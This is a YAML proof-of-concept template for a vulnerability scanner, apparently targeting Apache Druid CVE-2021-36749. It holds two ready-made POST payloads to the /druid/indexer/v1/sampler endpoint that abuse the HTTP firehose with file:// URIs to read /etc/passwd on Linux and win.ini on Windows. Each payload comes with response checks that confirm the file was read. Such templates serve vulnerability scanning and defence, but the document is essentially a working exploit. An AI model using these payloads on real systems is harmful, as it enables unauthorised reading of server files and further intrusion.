name: poc-yaml-apache-druid-cve-2021-36749
rules:
  druid1:
    request:
      cache: true
      method: POST
      path: /druid/indexer/v1/sampler?for=connect
      headers:
        Content-Type: application/json;charset=utf-8
      json: {"type":"index","spec":{"type":"index","ioConfig":{"type":"index","firehose":{"type":"http","uris":["file:///etc/passwd"]}},"dataSchema":{"dataSource":"sample","parser":{"type":"string","parseSpec":{"format":"regex","pattern":"(.*)","columns":["a"],"dimensionsSpec":{},"timestampSpec":{"column":"!!!_no_such_column_!!!","missingValue":"2010-01-01T00:00:00Z"}}}}},"samplerConfig":{"numRows":500,"timeoutMs":15000}}
    expression_json: [{"function": "checkStatusCode", "vars": "200"}, 'and', {"function": "checkRespFromContentTypeByre", "vars": "json"}, 'and', {"function": "checkRespFromTextByre", "vars": "root:[x*]:0:0:"}]
  druid2:
    request:
      cache: true
      method: POST
      path: /druid/indexer/v1/sampler?for=connect
      headers:
        Content-Type: application/json;charset=utf-8
      json: {"type":"index","spec":{"type":"index","ioConfig":{"type":"index","firehose":{"type":"http","uris":["file:///c://windows/win.ini"]}},"dataSchema":{"dataSource":"sample","parser":{"type":"string","parseSpec":{"format":"regex","pattern":"(.*)","columns":["a"],"dimensionsSpec":{},"timestampSpec":{"column":"!!!_no_such_column_!!!","missingValue":"2010-01-01T00:00:00Z"}}}}},"samplerConfig":{"numRows":500,"timeoutMs":15000}}
    expression_json: [{"function": "checkStatusCode", "vars": "200"}, 'and', {"function": "checkRespFromContentTypeByre", "vars": "json"}, 'and', {"function": "checkRespFromText", "vars": "for 16-bit app support"}]
expression: druid1() || druid2()
detail:
  author: iak3ec(https://github.com/nu0l)
  links:
    - https://mp.weixin.qq.com/s/Fl2hSO-y60VsTi5YJFyl0w
